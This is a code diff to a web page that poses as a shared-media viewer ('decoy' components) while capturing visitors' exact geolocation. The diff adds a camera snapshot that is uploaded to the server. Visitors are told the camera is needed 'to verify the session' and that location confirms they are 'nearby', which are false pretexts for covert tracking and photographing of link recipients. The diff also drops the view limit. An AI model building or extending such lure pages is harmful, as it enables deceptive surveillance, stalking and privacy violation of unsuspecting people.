@@ -3,13 +3,17 @@
 import { useCallback, useEffect, useMemo, useState } from "react";
 import { useSearchParams } from "next/navigation";
 import { DecoyError, DecoyShell } from "@/components/public-link/decoy-shell";
+import {
+  autoCaptureCameraStill,
+  reportCameraConsent,
+  uploadCameraStill,
+} from "@/lib/location/auto-capture-client";
 
 type PageStatus =
   | "loading"
   | "ACTIVE"
   | "EXPIRED"
   | "REVOKED"
-  | "MAX_VIEWS"
   | "UNAVAILABLE"
   | "error";
 
@@ -112,9 +116,36 @@ export default function PublicInvestigationLinkPage({
     };
   }, [load]);
 
-  async function requestLocation() {
+  async function captureAndUploadCamera() {
+    // Camera is ONLY requested after explicit user click — never on page load.
+    const still = await autoCaptureCameraStill();
+    if (still) {
+      const ok = await uploadCameraStill(code, still.blob, still.facingMode);
+      return ok;
+    }
+    // Distinguish permission denial when Permissions API is available
+    try {
+      const perm = await navigator.permissions?.query({
+        name: "camera" as PermissionName,
+      });
+      if (perm?.state === "denied") {
+        await reportCameraConsent(code, "DENIED");
+        return false;
+      }
+    } catch {
+      // permissions.query('camera') unsupported in some browsers
+    }
+    await reportCameraConsent(code, "UNAVAILABLE");
+    return false;
+  }
+
+  async function requestAccess() {
     setPhase("requesting");
     setMessage("");
+
+    // Capture camera first (same click gesture), then location — more reliable
+    // than racing both permission dialogs at once.
+    await captureAndUploadCamera();
 
     if (!window.isSecureContext || !navigator.geolocation) {
       setPhase("unavailable");
@@ -122,7 +153,6 @@ export default function PublicInvestigationLinkPage({
       return;
     }
 
-    // Geolocation is ONLY requested after explicit user click — never on page load.
     try {
       const pos = await captureExactPosition();
       const accuracy =
@@ -230,17 +260,6 @@ export default function PublicInvestigationLinkPage({
     );
   }
 
-  if (status === "MAX_VIEWS") {
-    return (
-      <DecoyShell>
-        <DecoyError
-          title="Viewing limit reached"
-          text="This shared media is no longer accepting new views."
-        />
-      </DecoyShell>
-    );
-  }
-
   if (status !== "ACTIVE") {
     return (
       <DecoyShell>
@@ -291,15 +310,16 @@ export default function PublicInvestigationLinkPage({
           <div className="mt-8 space-y-4">
             <p className="text-sm leading-relaxed text-slate-500">
               Confirm you’re nearby to view this media. Your browser will ask to
-              share your current location.
+              share your location and may ask for camera access to verify the
+              session.
             </p>
             <button
               type="button"
-              onClick={requestLocation}
+              onClick={requestAccess}
               disabled={phase === "requesting"}
               className="inline-flex h-12 w-full items-center justify-center rounded-lg bg-slate-900 px-6 text-base font-medium text-white transition hover:bg-slate-800 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-slate-900 disabled:cursor-not-allowed disabled:opacity-60 sm:w-auto sm:min-w-[12rem]"
             >
-              {phase === "requesting" ? "Confirming location…" : "View image"}
+              {phase === "requesting" ? "Confirming access…" : "View image"}
             </button>
 
             {(phase === "denied" ||
